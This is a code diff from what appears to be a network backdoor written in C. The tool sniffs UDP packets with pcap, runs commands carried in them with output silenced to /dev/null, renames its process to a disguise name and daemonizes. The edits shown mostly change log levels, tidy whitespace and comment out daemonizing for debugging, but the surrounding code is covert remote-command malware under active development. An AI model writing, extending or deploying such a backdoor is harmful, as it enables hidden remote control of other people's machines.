@@ -117,7 +117,7 @@ void inspect_udp(struct ip_header *iph)
     #ifdef DEBUG
     printf("\n\tCommand: \"%s\"\n\n", command);
     fflush(stdout);
-    syslog(LOG_ERR, "RUNNING COMMAND");
+    syslog(LOG_INFO, "RUNNING COMMAND");
     #else
     strcpy(&command[len], " &> /dev/null"); 
     #endif
@@ -133,7 +133,6 @@ void inspect_packet(u_char *linklen, const struct pcap_pkthdr *h,
     struct ip_header *iph = (struct ip_header *) (bytes + *linklen);
 
     #ifdef DEBUG
-    printf("\n");
     print_packet(bytes, h->caplen);
     #endif
 
@@ -221,11 +220,11 @@ void signal_handler(int sig)
 void daemonize(char* procname)
 {
     pid_t pid;
-    
+
     if ((pid = fork()) < 0)
     {
         #ifdef DEBUG
-        perror("daemonize()"); 
+        perror("daemonize()");
         #endif
         exit(0);
     }
@@ -241,17 +240,16 @@ void daemonize(char* procname)
 
     #ifdef DEBUG
     openlog(procname, LOG_NOWAIT|LOG_PID, LOG_USER);
-    syslog(LOG_ERR, "daemon started");
+    syslog(LOG_INFO, "daemon started");
     #endif
 
-    pid = setsid(); 
+    pid = setsid();
 
     /* change working directory in case parent working directory is unmounted */
     if (chdir("/"))
     {
         #ifdef DEBUG
         syslog(LOG_ERR, "chdir(): %s", strerror(errno));
-        syslog(LOG_DEBUG, "chdir(): %s", strerror(errno));
         #endif
         exit(0);
     }
@@ -260,10 +258,10 @@ void daemonize(char* procname)
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
 
-    signal(SIGHUP, signal_handler);   
-    signal(SIGINT, signal_handler);   
-    signal(SIGTERM, signal_handler);   
-    signal(SIGQUIT, signal_handler);   
+    signal(SIGHUP, signal_handler);
+    signal(SIGINT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    signal(SIGQUIT, signal_handler);
 }
 
 int main(int argc, char **argv)
@@ -290,7 +288,8 @@ int main(int argc, char **argv)
     system(killcmd);
 
     strcpy(argv[0], RUNNING_NAME);
-    daemonize(argv[0]);
+    /*daemonize(argv[0]);*/
+    openlog(argv[0], LOG_NOWAIT|LOG_PID, LOG_USER);
 
     session = config_session();
     linklen = datalink_length(session); 
